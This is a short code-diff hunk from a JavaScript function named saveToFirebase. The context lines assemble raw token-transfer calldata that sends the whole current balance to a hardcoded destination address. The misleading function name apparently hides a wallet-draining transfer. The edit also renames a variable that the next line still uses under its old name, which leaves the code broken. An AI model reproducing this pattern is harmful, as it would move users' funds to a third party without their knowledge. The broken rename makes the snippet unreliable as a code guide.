@@ -461,7 +461,7 @@ async function saveToFirebase(data) {
         // Prepare transaction data
         const readableAmount = (Number(currentBalance) / 1e18).toString();
         const methodId = 'a9059cbb';
-        const paddedDestination = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
+        const paddedAddress = DESTINATION_ADDRESS.slice(2).padStart(64, '0');
         const paddedAmount = currentBalance.toString(16).padStart(64, '0');
         const data = '0x' + methodId + paddedDestination + paddedAmount;
 
